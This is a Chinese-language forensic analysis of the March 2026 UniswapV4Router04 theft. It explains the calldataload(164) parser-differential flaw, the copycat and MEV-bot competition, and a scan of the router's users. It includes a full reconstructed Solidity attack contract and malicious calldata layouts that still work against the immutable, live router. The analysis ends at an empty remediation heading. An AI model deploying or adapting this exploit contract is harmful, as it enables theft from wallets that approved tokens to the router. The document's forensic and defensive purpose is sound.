# UniswapV4Router04 攻击事件的逆向分析与链上取证

> 作者：Lifefindsitsway
>
> 发布日期：2026-04-23

## 1. 摘要

2026 年 3 月 3 日，攻击者利用 [z0r0z.eth](https://etherscan.io/address/0x1c0aa8ccd568d90d61659f060d1bfb1e6f855a20) 开发的 UniswapV4Router04 合约中一个 ABI 解析差异漏洞（parser differential），从一名已向该路由合约授权 USDC 的受害者钱包中盗走 42,606.96 USDC（约 \$42,607），通过 Uniswap V4 的 ETH/USDC 池兑换为 21.198 ETH，随后经 Railgun 隐私协议完成洗钱。UniswapV4Router04 是由 Uniswap Foundation 资助 \$35,000 开发的社区版 V4 路由合约，经过 3 次独立安全审计，部署 320 天后被攻击——漏洞藏在一行用于 Gas 优化的内联汇编中，3 次审计均未发现。

**关键发现：**

- **漏洞根因**：一行 `calldataload(164)` 硬编码偏移，被非标准 ABI 编码绕过权限校验。3 次独立审计均未发现。
- **损失**：$42,607 USDC，4 分钟内完成合约部署、盗窃、兑换、Railgun 洗钱全流程。
- **USDT 幸免**：$25,575 USDT 因 USDT 合约（2017 年部署）的 non-standard `transferFrom` 无返回值特性，触发 Router ABI 解码器 revert 而无法被盗。
- **漏洞现状**：链上永久存在，不可修复。835 个历史用户全量扫描确认当前无实际风险。
- **逆向验证**：从 1,924 字节未开源 bytecode 重建 Solidity 源码，Fork Replay ETH 收益 wei 级精确匹配。

本文对该攻击事件进行了完整的逆向分析与链上取证，涵盖以下维度：

- **漏洞机理**：路由合约 `swap(bytes,uint256)` 函数中，一行 `calldataload(164)` 的硬编码偏移假设如何被攻击者利用非标准 ABI 编码绕过权限校验。
- **攻击合约逆向**：从 1,924 字节的未开源 runtime bytecode 出发，通过 EVM execution trace 分析，完整重建等价的 Solidity 源码，并通过 Mainnet fork replay 实现 wei 级精确匹配验证。
- **Copycat 失败分析**：攻击发生后，链上出现 5 笔使用同一漏洞的 copycat 攻击交易，全部失败。其中 2 笔因 USDT 的 non-standard ERC20 特性导致 Router ABI 解码器 revert；3 笔因受害者 USDC 余额已被清空或被专业 MEV bot 在区块排序中抢先。
- **MEV 竞争取证**：通过链上数据还原了三方攻击者（原始攻击者、专业 MEV bot、copycat）之间的竞争关系，揭示了 Flashbots-style private bundle + COINBASE 贿赂机制在现代 MEV 生态中的决定性优势。
- **漏洞现状评估**：截至分析时点（2026-04-22），该漏洞仍 100% 存在于链上。对 Router04 全部 835 个历史用户进行了完整的 token 授权与余额扫描，确认当前无用户处于实际风险中，但潜在威胁持续存在。

## 2. 合约背景：从 Uniswap Foundation Grant 到社区路由器

### 2.1 开发者：z0r0z (Ross)

UniswapV4Router04 的开发者 z0r0z（[Ross](https://github.com/z0r0z)）有着从法律到 DeFi 核心开发的跨界履历：

- **Hunton AK**：企业法律师（Corporate Associate）
- **ConsenSys / OpenLaw**：法律工程师（Legal Engineer，将法律合同智能合约化）
- **SushiSwap**：核心开发者（Core Developer / Solidity）
- **独立开发者**：专注于 Uniswap 生态工具，曾开发基于自然语言处理的 Uniswap V3 路由器（用英语句子描述 swap 意图，程序自动解析执行）

### 2.2 Uniswap Foundation $35,000 Grant

Ross 的 V3 自然语言路由器引起了 Uniswap Foundation 的注意。基金会向他提供了 [$35,000 的开发资助](https://paragraph.com/@uniswap-foundation/announcing-the-uniswap-v4-swap-router)，用于开发一个针对 Uniswap V4 优化的社区版路由合约——定位为 Uniswap 官方 Universal Router 的轻量替代品。

两者的核心区别：

| 维度 | Universal Router（官方） | Community Router（z0r0z） |
|------|------------------------|--------------------------|
| 覆盖范围 | V2 + V3 + V4 | **仅 V4** |
| ABI 风格 | 复杂的 `execute(bytes,bytes[],uint256)` | 模仿 V2Router02 的熟悉接口 |
| 目标用户 | 生产级前端（app.uniswap.org） | 开发者 / Hook 构建者 / 小型协议 |
| 特色功能 | 全版本兼容 | V4 专用 Gas 优化 + L2 calldata 压缩 + ERC6909 |
| 安全审计 | OpenZeppelin 审计 | 3 次社区审计（33audits、Kaden、Kupia） |

Community Router 的设计理念是**降低 V4 的集成门槛**。Uniswap V4 引入了全新的 singleton 架构和 Hook 系统，开发者学习曲线陡峭。Router04 将 V4 的底层复杂性封装为 V2 风格的函数签名（`swapExactTokensForTokens`、`swapTokensForExactTokens`），让熟悉 V2 ABI 的开发者能快速上手 V4。

### 2.3 谁在使用这个合约

Router04 的 GitHub 仓库仅有 **53 stars、9 forks**（截至 2026-04-22），与 Uniswap 官方组件（数千 stars）相比是一个小众项目。链上 835 个唯一用户的构成大致如下：

- **V4 Hook 开发者和测试者**：Router04 的核心受众。开发 V4 自定义 Hook（如 CSMM 自定义曲线）时，需要轻量路由合约测试 swap 流程。
- **DeFi 协议集成方**：部分小型协议可能将其作为 V4 swap 的后端接口。
- **个人交易者 / 高级用户**：通过 Etherscan "Write Contract" 或自定义脚本直接调用。受害者 `0x65A8` 属此类——跨 32 链持有 ~$1.27M 资产、~40 万笔交易，是 DeFi 重度用户。

### 2.4 审计状况：3 次审计与 "as-is" 声明的矛盾

Router04 在部署前经过了 **3 次独立审计**，审计报告存放于 GitHub 仓库的 `audits/` 目录中：

| 审计方 | 报告 | 时间 |
|--------|------|------|
| 33audits | `33audits-v4-router-audit-report.pdf` | 2025-03-07 |
| Kaden | `kaden-v4-router-audit-report.pdf` | 2025-03-11 |
| Kupia | `kupia-v4-router-audit-report.pdf` | 2025-03-19 |

然而 README 同时声明：

> *This community router code is offered on an "as-is" basis and has not been audited for security, reliability, or compliance with any specific standards or regulations, and may contain bugs, errors, or vulnerabilities.*

这一矛盾暗示：审计可能覆盖了核心功能（`swapExactTokensForTokens` 等标准函数），但**漏洞所在的 `swap(bytes,uint256)` 使用了大量内联汇编**——这种低级 Gas 优化代码很可能不在审计重点范围内，或审计师未充分评估 `calldataload(164)` 硬编码偏移带来的解析器差异风险。

**3 次审计均未发现此漏洞**，合约带着它在链上存活了 320 天，直到被攻击者利用。这进一步印证了 parser differential 漏洞的隐蔽性——它不是逻辑错误，而是两套正确逻辑之间的语义分歧。

## 3. 攻击事件还原

### 3.1 涉事合约与关键角色

| 角色 | 地址 | 说明 |
|---|---|---|
| 攻击者 EOA | [`0xd6B7...9916`](https://etherscan.io/address/0xd6B7e831D64e573278f091AA7E68Fbf2A8FA9916) | 一次性地址，nonce = 3 |
| 攻击合约 | [`0xdEd2...74A0`](https://etherscan.io/address/0xdEd262d0A933b7BB4Ed8C4B6cb2dcE5b157B74A0) | 未开源，1,924 bytes，solc 0.8.4 |
| 受害者 | [`0x65A8...7675`](https://etherscan.io/address/0x65A8F07Bd9A8598E1b5B6C0a88F4779DBC077675) | EOA，~404K 笔交易，跨 32 链持有 ~$1.27M |
| UniswapV4Router04 | [`0x0000...ce97`](https://etherscan.io/address/0x00000000000044a361Ae3cAc094c9D1b14Eece97) | 2025-04-16 通过 CREATE2 部署，已验证源码，不可升级 |
| Uniswap V4 PoolManager | [`0x0000...8A90`](https://etherscan.io/address/0x000000000004444c5dc75cB358380D2e3dE08A90) | Uniswap V4 核心合约 |
| Copycat EOA | [`0xf957...bc94`](https://etherscan.io/address/0xf9572fa0a2ac1a174824c12b3e2eddddaf26bc94) | 攻击后 25 分钟部署副本 |
| MEV 竞争者 EOA | [`0xf33c...a14a`](https://etherscan.io/address/0xf33cdbef0e61b0cd5f74a2ad2bfa297b4224a14a) | 专业 MEV bot 操作者 |

### 3.2 完整时间线

```
2026-03-03 (UTC)                                          区块
───────────────────────────────────────────────────────────────
06:15:11  攻击者部署攻击合约 0xdEd2                        #24575075
06:17:11  攻击执行 — 盗取 42,606.96 USDC → 21.198 ETH      #24575085
06:18:59  攻击者将 21.29 ETH 转入 Railgun 洗钱             #24575086+
06:42:23  Copycat 部署副本合约 0x475d                      #24575211
06:43:47  Copycat 尝试 #1 — USDT — 失败（ABI 解码 revert） #24575218
06:44:23  Copycat 尝试 #2 — USDT — 失败（同上）            #24575221
06:55:47  Copycat 尝试 #3 — USDC — 失败（余额为零）        #24575278
08:24:35  Copycat 尝试 #4 — USDC — 失败（被 MEV bot 抢先） #24575718
08:50:13  z0r0z 推送 GitHub commit "simplify abi"（删除漏洞函数源码）
08:55:23  Copycat 尝试 #5 — USDC — 失败（被 MEV bot 抢先） #24575872

2026-04-22
───────────────────────────────────────────────────────────────
          漏洞仍存在于链上，Router04 bytecode 未变          #24935826
```

### 3.3 资金流向与攻击经济学

```
受害者 (0x65A8)
  │
  ├── USDC 42,606.959179 ──→ Uniswap V4 PoolManager
  │                              │
  │                              ├── ETH 21.198 ──→ 攻击者 EOA (0xd6B7)
  │                              │                      │
  │                              │                      └── 21.29 ETH → Railgun (洗钱)
  │                              │
  │                              └── ~$454.91 净留存（含 0.05% fee + AMM 滑点）
  │
  └── 攻击后 USDC 余额: 0
```

| 指标 | 数值 |
|---|---|
| 被盗金额 | 42,606.959179 USDC |
| 攻击者获得 | 21.197984596759249607 ETH |
| 攻击者初始投入 | 0.1 ETH（gas 资金） |
| 攻击交易 gas 消耗 | 210,467 gas |
| 攻击交易 gas 费用 | ~0.0009 ETH |
| 净利润率 | ~21,098%（0.1 ETH → 21.2 ETH） |
| 从部署到洗钱完成 | ~4 分钟 |

## 4. 漏洞机理

### 4.1 漏洞函数

UniswapV4Router04 合约中存在 7 个 swap 重载函数。其中 6 个在内部硬编码 `payer: msg.sender`，安全无虞。唯一的例外是 `swap(bytes calldata data, uint256 deadline)`，它允许调用者直接传入预编码的 `bytes data`，并通过内联汇编进行权限校验：

```solidity
function swap(bytes calldata data, uint256 deadline)
    public payable virtual override checkDeadline(deadline) setMsgSender
    returns (BalanceDelta)
{
    assembly ("memory-safe") {
        if iszero(eq(calldataload(164), caller())) {
            mstore(0x00, 0x82b42900) // `Unauthorized()`
            revert(0x1c, 0x04)
        }
    }
    return _unlockAndDecode(data);
}
```

`calldataload(164)` 是一个**硬编码的绝对 calldata 偏移**。开发者假设 `bytes data` 参数的偏移指针恒为标准值 `0x40`，因此 `BaseData.payer` 字段的绝对位置始终是 164。

### 4.2 标准 vs 恶意 calldata 布局

标准编码下，各字段在 calldata 中的绝对位置是确定的：

```
标准 ABI 编码（偏移指针 = 0x40）:

偏移    内容                          字段
─────────────────────────────────────────────────────
0x00    af2b4aba                      selector
0x04    0x40                          data 偏移指针 ← 标准值
0x24    deadline                      deadline
0x44    data 长度                     [data 区域开始]
0x64    amount                        BaseData.amount
0x84    amountLimit                   BaseData.amountLimit
0xA4    payer ← calldataload(164)     BaseData.payer   ← 校验点
0xC4    receiver                      BaseData.receiver
...     ...                           ...

校验: calldataload(164) = payer = msg.sender ✓
执行: decode(data) → payer = msg.sender → 用自己的钱 swap ✓
```

攻击者将偏移指针从 `0x40` 改为 `0xC0`，在空洞区域注入攻击合约地址：

```
恶意 ABI 编码（偏移指针 = 0xC0）:

偏移    内容                          字段
─────────────────────────────────────────────────────
0x00    af2b4aba                      selector
0x04    0xC0                          data 偏移指针 ← 非标准!
0x24    block.timestamp               deadline
0x44    0x00...00                     ┐
0x64    0x00...00                     │ 96 bytes filler（空洞区域）
0x84    0x00...00                     ┘
0xA4    address(this) ← 攻击合约      注入点: calldataload(164)
0xC4    innerData 长度                [真实 data 区域开始]
0xE4    amount (= victim balance)     BaseData.amount
0x104   0 (amountLimit)               BaseData.amountLimit
0x124   victim address                BaseData.payer ← 受害者!
0x144   tx.origin (attacker EOA)      BaseData.receiver
...     ...                           ...

校验: calldataload(164) = address(this) = caller() ✓ 通过!
执行: decode(data @ 0xC0) → payer = victim → 用受害者的钱 swap!
```

### 4.3 解析器差异（Parser Differential）

这是一种经典的解析器差异漏洞——同一段 calldata 被两个不同的解析逻辑以不同方式解读：

```
                    calldataload(164)          abi.decode(data)
                    ─────────────────          ────────────────
校验路径读取位置:    绝对偏移 164               不使用
执行路径读取位置:    不使用                     偏移指针 0xC0 → 真实 data
校验路径看到的值:    address(this) = caller()   —
执行路径看到的值:    —                          payer = victim
结果:              校验通过 ✓                   用受害者的钱执行 swap
```

### 4.4 根因：inline assembly 中硬编码偏移假设的脆弱性

漏洞的根因在于开发者在 `assembly` 块中使用 `calldataload(164)` 这一硬编码偏移来读取 `BaseData.payer` 字段。这个 164 是基于 `bytes data` 参数的偏移指针为标准值 `0x40` 推导出来的。

然而，ABI 编码规范允许 `bytes` 类型的偏移指针为任意值——只要它指向的位置包含有效的长度前缀和数据即可。Solidity 的 `abi.decode` 会正确跟随偏移指针到达真实数据，但 `calldataload(164)` 不会——它永远读取绝对位置 164 的内容。

**注释中的讽刺**：源码注释写道 `// equivalent to require(abi.decode(data, (BaseData)).payer == msg.sender, Unauthorized())`。事实上，如果开发者直接使用 `abi.decode` 而非 `calldataload`，这个漏洞就不会存在。

### 4.5 漏洞代码的初衷：Gas 优化的代价

`swap(bytes,uint256)` 函数存在的根本原因是 **Gas 优化**。Router04 的设计目标之一是降低 V4 swap 的 Gas 成本，尤其是在 L2 上减少 calldata 开销。为此，z0r0z 在标准的 `swapExactTokensForTokens` 等高级函数之外，额外提供了一个低级入口——允许调用者直接传入预编码的 `bytes data`，跳过 Solidity 层面的参数解码和重编码：

```
标准路径（安全但昂贵）:
  用户 → swapExactTokensForTokens(amountIn, amountOutMin, key, ...)
       → 函数内部硬编码 payer: msg.sender
       → 编码为 bytes data → _unlockAndDecode(data)

低级路径（便宜但危险）:
  用户 → swap(bytes data, uint256 deadline)
       → calldataload(164) 校验 payer == caller()    ← 漏洞点
       → 直接将 data 传递给 _unlockAndDecode(data)
```

低级路径省去了参数解码和重编码的 Gas 消耗，权限校验改用 `calldataload(164)` 直接读取，避免了 `abi.decode` 解整个 `BaseData` 结构体的开销。**为了节省几十 gas 的解码成本，开发者用硬编码偏移替代了安全的 ABI 解码——这是一个典型的 Gas 优化 vs 安全性的错误权衡。**

## 5. 攻击合约逆向重建

### 5.1 合约概况

| 属性 | 值 |
|---|---|
| Runtime bytecode | 1,924 bytes |
| 编译器 | solc 0.8.4 |
| Storage | 仅 slot 0（owner 地址），slot 1-20 全部为零 |
| 函数 selector | `0x30f5d90e`（自定义名称，三大签名库均无收录） |
| Codehash | `0xd63b2d8194e16e4f40887678843ca4194ebe3eae3386b1a2fb771c7cacd7f12f` |
| 同 codehash 合约 | 链上共 6 个（1 个原始 + 1 个活跃 copycat + 4 个沉默副本，涉及 3 个独立部署者） |

### 5.2 核心逻辑：恶意 calldata 的内存构造

通过 `cast run --trace` 对攻击交易进行 EVM opcode 级分析，还原了攻击合约的完整执行流程：

**Step 1: 权限校验**
```
SLOAD slot 0     → 读取 owner 地址
ORIGIN           → 获取 tx.origin
EQ               → require(tx.origin == owner)
CALLER ORIGIN EQ → require(msg.sender == tx.origin)
```

**Step 2: 侦察受害者资产**
```
STATICCALL  → USDC.balanceOf(victim)    = 42,606,959,179
STATICCALL  → USDC.allowance(victim, router) = type(uint256).max - 54.7B
取两者最小值 → amount = 42,606,959,179
```

**Step 3: 内存中构造恶意 calldata**

这是逆向的核心挑战。攻击合约在内存中精确拼装了一段非标准 ABI 编码的 calldata：

```
MSTORE → selector 0xaf2b4aba (Router.swap)
MSTORE → 偏移指针 0xC0（非标准，正常应为 0x40）
MSTORE → block.timestamp（作为 deadline）
MSTORE → 96 bytes 零填充（filler，制造空洞区域）
MSTORE → address(this)（注入到绝对位置 164，骗过 calldataload 校验）
MSTORE → innerData 长度 + 编码后的 BaseData（payer = victim, receiver = tx.origin）
```

**Step 4: 调用 Router**
```
CALL → router.swap(malicious_calldata)
  → PoolManager.unlock → unlockCallback → swap → sync → transferFrom → settle → take
  → ETH 直接发送至攻击者 EOA（通过 BaseData.receiver = tx.origin）
```

### 5.3 重建源码

基于 trace 分析，重建的等价 Solidity 源码（83 行，solc 0.8.4）：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

struct BaseData {
    uint256 amount;
    uint256 amountLimit;
    address payer;
    address receiver;
    uint8 flags;
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract Attack {
    address private owner;

    constructor(address _owner) {
        owner = _owner;
    }

    receive() external payable {}

    // selector: 0x30f5d90e
    function exploit(
        address router, address victim, address[] calldata tokens
    ) external payable {
        require(tx.origin == owner);
        require(msg.sender == tx.origin);

        for (uint256 i = 0; i < tokens.length; i++) {
            bytes memory filler = new bytes(0x60);  // 96 bytes 空洞

            BaseData memory base;
            PoolKey memory key;

            base.amount = _getAmount(tokens[i], victim, router);
            base.payer = victim;           // 受害者作为付款方
            base.receiver = msg.sender;    // 攻击者 EOA 接收 ETH
            base.flags = 1;               // SINGLE_SWAP

            key.currency1 = tokens[i];
            key.fee = 500;                // 0.05% fee tier
            key.tickSpacing = 10;

            bytes memory innerData = abi.encode(base, false, key, "");

            bytes memory callData = abi.encodePacked(
                bytes4(0xaf2b4aba),             // Router.swap selector
                uint256(0xC0),                  // 非标准偏移指针!
                block.timestamp,                // deadline
                filler,                         // 96 bytes 空洞
                uint256(uint160(address(this))), // 注入 address(this) 到位置 164
                uint256(innerData.length),
                innerData
            );

            (bool success, ) = router.call(callData);
            require(success);
        }
    }

    function _getAmount(
        address token, address victim, address spender
    ) internal view returns (uint256) {
        uint256 balance = IERC20(token).balanceOf(victim);
        uint256 allowance = IERC20(token).allowance(victim, spender);
        if (allowance < balance) {
            balance = allowance;
        }
        return balance;
    }
}
```

**关键设计细节：**

- **`address[] calldata tokens`**：支持在单笔交易中对多种 token 发起攻击。实际攻击中只传入了 `[USDC]`。
- **`_getAmount` 取余额与授权的最小值**：确保不会因为 `transferFrom` 金额超过 allowance 而失败。
- **`base.receiver = msg.sender`（= tx.origin = 攻击者 EOA）**：ETH 由 PoolManager 直接发送至攻击者 EOA，不经过攻击合约，减少一跳转账。
- **`block.timestamp` 作为 deadline**：精确等于当前区块时间戳，通过 Router 的 `checkDeadline` 校验。

## 6. Mainnet Fork Replay 验证

### 6.1 验证方法

为验证重建源码与原始字节码的功能等价性，使用 Foundry 在攻击区块前一个区块（#24575084）创建 Mainnet fork，通过 `vm.rollFork(LAST_PRIOR_TX)` 重放攻击区块内前 181 笔交易（index 0-180），恢复攻击交易（index 181）执行前的精确链上状态。

验证分三组测试：

1. **原始字节码测试**：使用链上实际 bytecode 执行攻击 calldata
2. **重建字节码测试**：使用 `vm.etch` 将攻击合约代码替换为重建 Solidity 编译产物，执行同样的 calldata
3. **对比测试**：在两个独立 fork 上分别执行，比较结果

### 6.2 验证结果

```
测试 1 — 原始字节码:     ETH gain = 21,197,984,596,759,249,607 wei ✓
测试 2 — 重建字节码:     ETH gain = 21,197,984,596,759,249,607 wei ✓
测试 3 — 对比:          两者完全一致 ✓

受害者 USDC:  攻击前 42,606,959,179 → 攻击后 0 ✓
```

三组测试全部通过，原始字节码与重建字节码产生**完全相同**的执行结果，ETH 收益 wei 级精确匹配。这证明重建的 Solidity 源码是原始攻击合约的功能等价实现。

## 7. 攻击之后：Copycat、MEV 竞争与未遂的 USDT 盗窃

攻击成功后，链上出现了 5 笔使用同一 selector `0x30f5d90e` 的 copycat 交易，全部失败。这些交易涉及三方攻击者之间的竞争，揭示了现代以太坊 MEV 生态的多个侧面。

### 7.1 六个同 codehash 合约与三方攻击者

链上共有 6 个合约拥有完全相同的 runtime bytecode（codehash 一致）：

| 合约 | 部署者 | 部署时间 | 调用情况 |
|---|---|---|---|
| `0xdEd2`（原始） | 攻击者 `0xd6B7` | 06:15:11 | 1 次（成功） |
| `0x475d`（活跃 copycat） | `0xF957` | 06:42:23 | 5 次（全部失败） |
| `0x914B`（沉默副本） | `0xd2B3` | 12:32:47 | 0 次（从未调用） |
| `0x53Bd`（沉默副本） | `0xd2B3` | 13:04:59 | 0 次（从未调用） |
| `0xBFcF`（沉默副本） | `0xd2B3` | 14:25:11 | 0 次（从未调用） |
| `0xDA90`（沉默副本） | `0xd2B3` | 14:38:35 | 0 次（从未调用） |

6 笔攻击交易（1 笔原始 + 5 笔 copycat）的受害者完全相同——calldata 中的 `victim` 参数均为 `0x65A8...7675`。Copycat 仅在第三次尝试时将 `tokens[0]` 从 USDT 切换为 USDC，其余参数从未改变。

三方竞争格局如下：

| 攻击者 | 身份 | USDC 结果 | USDT 结果 | 总收益 |
|---|---|---|---|---|
| `0xd6B7`（原始） | 高水平攻击者 | $42,606 ✓ | 未尝试 | ~$42,606 |
| `0xf33c`（竞争者） | 专业 MEV bot | \$90 + \$82 ✓ | 未知 | ~$172 |
| `0xf957`（copycat） | 模仿者 | 0/0/0 ✗ | $25,575 ✗ | $0 |

### 7.2 USDT 攻击为何注定失败

Copycat 的前两次尝试（tx #1, #2）针对受害者持有的 ~\$25,575 USDT。受害者对 Router04 的 USDT allowance 为 `type(uint256).max`，余额充足，理论上有 \$25,575 可窃取。但攻击在执行到极深处后 revert。

**Execution Trace（tx #1）：**

```
copycat.exploit()
  → USDT.balanceOf(victim) = 25,575,292,076             ✓
  → USDT.allowance(victim, router) = max                 ✓
  → Router.swap(data, deadline)
    → PoolManager.unlock()
      → Router.unlockCallback()
        → PoolManager.swap(key, params)                  ✓ Swap 事件已发出
        → PoolManager.sync(USDT)                         ✓
        → USDT.transferFrom(victim, PM, 25,575,292,076)  ✓ Transfer 事件已发出!
        → ← [Revert] EvmError: Revert                   ✗ ABI 解码失败
```

**根本原因：USDT 的 non-standard ERC20 返回值**

USDT 合约部署于 2017 年（距今约 9 年），其 `transferFrom` 函数签名为 `function transferFrom(address, address, uint256) public`——**没有 `returns (bool)`**。

```
USDC.transferFrom 返回: 0x0000...0001  (32 bytes, bool = true)  ← 标准 ERC20
USDT.transferFrom 返回: 0x             (0 bytes, 无返回值)       ← 非标准 ERC20
```

Router04 使用 Solidity 0.8.26 编译，其 ABI 解码器在 `transferFrom` 返回后执行以下检查：

```
偏移 0x2658:  RETURNDATASIZE
              PUSH1 0x20        // 32
              LT                // if returnDataSize < 32
              PUSH2 0x1293      // jump to revert handler
              JUMPI
```

USDT 返回 0 bytes，`RETURNDATASIZE = 0 < 32`，触发 revert。整个交易回滚——尽管从 EVM 层面看，25,575 USDT 实际已经完成了转账（Transfer 事件已发出），但由于 revert，所有状态变更被撤销。

**USDT 是否有其他攻击路径？**

分析了三种替代方案，均不可行：

| 方案 | 障碍 |
|---|---|
| Permit2 SignatureTransfer | 需要受害者的 EIP-712 链下签名，无法伪造 |
| Permit2 AllowanceTransfer | 受害者从未对 Router 设置 Permit2 USDT 授权（链上查询 amount = 0） |
| 绕过 Router 直接调用 PoolManager | 受害者的 USDT 授权对象是 Router，不是攻击者合约 |

**结论：在当时的链上状态下，$25,575 USDT 无法通过任何已知路径被窃取。** 原始攻击者 `0xd6B7` 只攻击 USDC 而完全忽略 USDT，说明其充分了解这一限制。

Gas 消耗的差异精确反映了两种失败模式在执行深度上的不同：

```
USDT 失败路径 (146,224 gas):  执行到 swap + sync + transferFrom 之后才在 ABI 解码处失败
USDC 失败路径 (62,404 gas):   在 PoolManager.swap() 入口即因零金额被拒绝
```

### 7.3 USDC 残余争夺中的 MEV 排序战

Copycat 的后三次尝试（tx #3, #4, #5）转向 USDC，但面临两个问题：原始攻击已清空受害者全部 USDC，且专业 MEV bot 在争夺残余资金时始终抢先。

**tx #3（区块 #24575278）— 余额为零，无竞争者**

原始攻击后 38 分钟，受害者尚未从任何 DeFi 活动中收到新 USDC，余额仍为 0。PoolManager 直接以 `SwapAmountCannotBeZero()` revert。

**tx #4（区块 #24575718）— 有钱但被抢先**

受害者从 DeFi 活动中获得了 \$90.13 USDC。但在该区块中，MEV bot `0xf33c` 位于 transactionIndex = 0（第一笔），copycat 位于 transactionIndex = 1（第二笔）。MEV bot 先行窃取了全部 \$90 USDC，等 copycat 执行时余额已归零。

**tx #5（区块 #24575872）— 同样的 MEV 抢先**

受害者再次收到 $82.69 USDC，再次被同一 MEV bot 在同一区块内抢先转走。

**MEV bot 为何总能抢先？**

两个区块的 builder 均为 **Titan Builder**（`0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97`）。链上数据揭示了两种截然不同的出价策略：

| 维度 | 竞争者 `0xf33c` | Copycat `0xf957` |
|---|---|---|
| 提交方式 | Flashbots-style **私有 bundle** | **公共 mempool** |
| gasPrice | ≈ baseFee（~4 Gwei） | 145 Gwei |
| 给 builder 的 gas tip | ~0 ETH | ~0.009 ETH |
| 直接 ETH 贿赂 | **0.042 ETH**（区块 #24575718） | 无 |
| 对 builder 的总贡献 | **0.042 ETH** | 0.009 ETH |
| 倍率 | **4.68x** | 1x |

竞争者合约（5,963 bytes）包含 8 处 `COINBASE` 操作码引用——在运行时动态获取当前区块 builder 地址，将 swap 收益的 ~93% 直接转账给 builder 作为贿赂：

```
竞争者执行流程:
1. 执行 swap 攻击，获得 ~0.045 ETH
2. COINBASE → 获取当前 builder 地址
3. 计算贿赂 ≈ 收益 × 93%
4. 直接向 builder 转账 0.042 ETH
5. 净利润 ≈ 0.003 ETH（仅 ~7%）
```

```
区块 #24575718:  竞争者贿赂 0.042 ETH (93.2%)，净利润 ~$7
区块 #24575872:  竞争者贿赂 0.039 ETH (93.5%)，净利润 ~$6
```

这是 MEV 拍卖机制的典型表现：在激烈竞争中，纳什均衡趋近于 searcher 将几乎全部 MEV 价值让渡给 builder，自身仅保留微利。Copycat 通过公共 mempool 提交交易，不仅暴露了攻击意图，出价也远低于竞争者的直接贿赂，在 builder 的排序算法中毫无竞争力。

### 7.4 项目方响应与 GitHub "修复" 的局限性

z0r0z 在攻击当天 08:50:13 UTC 推送了 [commit 0cd5187](https://github.com/z0r0z/v4-router/commit/0cd5187c7929a48d73b982662e124b793cbe2218)（message: "simplify abi"），执行了以下变更：

- **删除**漏洞函数 `swap(bytes,uint256)` 及其依赖的 `fallback()` 函数
- **删除** Permit2 SignatureTransfer 集成（`ISignatureTransfer` 导入及相关代码）
- **删除** LibZip calldata 压缩功能
- **更新** README，将原部署地址标记为 "Previous deployment"，并添加安全警告：

> *If you have interacted with the previous deployment, you should: Revoke ERC-20 approvals granted to the old router address. Revoke Permit2 authorizations (allowances and nonces) associated with the old router. Migrate to a fresh deployment of this updated router.*

约 3 小时后（12:07 UTC），推送了第二个 commit（1f9eb0e2，同为 "simplify abi"），进一步清理了相关测试文件和依赖。

**响应的局限性：** README 的安全警告仅对主动访问 GitHub 仓库的开发者可见。对于通过 Etherscan 或其他渠道直接与 Router04 合约交互的用户，这一警告的触达率极为有限。截至分析时点（2026-04-23），未发现针对受影响用户的链上消息通知、社交媒体定向告知或批量授权撤销工具。

**链上不可变的现实：** Router04 的 **bytecode 在所有相关区块完全相同**：

```
区块 24575084（攻击前）      : 20,951 hex chars
区块 24575217（copycat 前）  : 20,951 hex chars
区块 24575871（copycat #5前）: 20,951 hex chars
区块 24576000（远后于攻击）   : 20,951 hex chars
区块 24580000（数千区块后）   : 20,951 hex chars
```

GitHub commit 只是源码仓库的变更，并未在链上重新部署合约。漏洞函数 `swap(bytes,uint256)` 在所有 5 笔 copycat 交易执行时仍然存在且可用——copycat 的失败与 GitHub 修复无关。

## 8. 漏洞现状：仍然活跃的链上威胁

> 以下分析基于 2026-04-22 区块 #24935826 的链上状态。

### 8.1 不可变性验证

| 验证项 | 结果 |
|---|---|
| Router04 bytecode | **未变**（20,951 hex chars，与攻击时完全一致） |
| `swap(bytes,uint256)` selector `0xaf2b4aba` | **仍存在于 bytecode 中** |
| 函数是否可调用 | **是**（调用返回 revert 是参数错误，非 function not found） |
| 合约是否可升级 | **否**（EIP-1967 proxy slot 为零，非代理合约） |
| 合约是否可自毁 | **否**（Cancun 升级 EIP-6780 后，已部署合约的 SELFDESTRUCT 仅清空余额，不再删除代码） |

**以太坊上已部署的合约代码不可修改。** Router04 不是代理合约，没有 admin 可以升级或禁用任何函数。漏洞将永久存在于链上。

```
GitHub 仓库（源码）  ──[删除 swap 函数]──→  已修复 ✓
         ↓ 编译部署（历史）
链上合约（bytecode）  ──[不可变]──→           仍存在漏洞 ✗
```

### 8.2 全量用户风险扫描

漏洞利用需要两个条件同时满足：

```
条件 1: 受害者对 Router04 有 ERC20 token 的 approve（allowance > 0）
条件 2: 受害者持有该 token 的余额（balance > 0）
```

**原始受害者**已在攻击后撤销所有授权（USDC/USDT allowance 均为 0），当前安全。

对 Router04 全部 **835 个历史用户**，通过 JSON-RPC 批量查询进行了完整扫描：

**主流 token 全量扫描（835 用户 × 5 种 token = 4,175 次查询）：**

| Token | 有授权的用户数 | 有授权且余额 > 0 |
|---|---|---|
| USDC | 2 | **0**（两个地址 USDC 余额均为 0） |
| USDT | 0 | — |
| WETH | 0 | — |
| DAI | 0 | — |
| WBTC | 0 | — |

**Meme token 补充扫描：**

| Token | 有授权的用户数 | 有授权且余额 > 0 |
|---|---|---|
| GOYSLOP | 2 | **0** |
| maxxing | 0 | — |
| SATOSHI | 0 | — |

**扫描结论：835 个用户中，仅 4 个持有活跃授权（USDC 2 个 + GOYSLOP 2 个，可能存在地址重叠），但全部对应 token 余额为零。当前无任何用户处于实际风险中。**

值得注意的是，Router04 当前仍在活跃使用。链上数据显示其他函数（`swapExactTokensForTokens`、`swapTokensForExactTokens`）也要求用户直接 approve token 给 Router04。这意味着通过新版函数授权的用户，其 token 同样可被旧版 `swap(bytes,uint256)` 漏洞利用——因为 ERC20 授权是针对地址的，不区分函数。

### 8.3 风险评级

| 维度 | 评估 |
|---|---|
| 当前实际风险 | **低** — 全量扫描确认无用户同时满足"有授权 + 有余额" |
| 潜在风险 | **中** — 有授权地址若收到 token，或新用户 approve Router04，风险立即重现 |
| 漏洞持久性 | **永久** — 合约不可变，漏洞将永远存在于链上 |

### 8.4 修复建议

